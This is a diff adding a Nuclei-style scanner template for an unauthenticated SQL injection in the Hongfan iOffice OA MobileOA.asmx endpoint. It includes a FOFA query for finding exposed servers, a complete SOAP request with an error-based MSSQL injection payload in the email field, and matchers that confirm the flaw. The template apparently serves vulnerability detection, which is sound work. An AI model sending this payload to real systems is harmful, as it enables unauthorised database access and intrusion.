@@ -1,0 +1,41 @@
+id: hongfanOA-MobileOA_asmx-sql
+
+info:
+  name: 红帆OA MobileOA.asmx接口SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="红帆-ioffice"
+    红帆OA MobileOA.asmx接口缺乏对用户输入的有效过滤和校验机制，导致攻击者可在未认证状态下利用SQL注入技术获取数据库敏感信息（包括管理员凭证及用户隐私数据）。在具备高权限写入能力的场景下，攻击者可能通过注入操作在目标服务器部署恶意代码，最终实现对操作系统的控制。
+  reference:
+  - https://mp.weixin.qq.com/s/6vPmbFO4SxcZZlTm9RXPXw
+  tags: 红帆OA
+
+http:
+- raw:
+  - |
+    POST /ioffice/prg/set/wss/MobileOA.asmx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+    SOAPAction: "http://tempuri.org/GeMrNewData"
+    Content-Type: text/xml; charset=utf-8
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <GeMrNewData xmlns="http://tempuri.org/">
+          <MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(112)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
+        </GeMrNewData>
+      </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qzpbq1qjpbq'
+    - '转换成数据类型 int 时失败'
+    condition: and
+  - type: status
+    status:
+    - 500
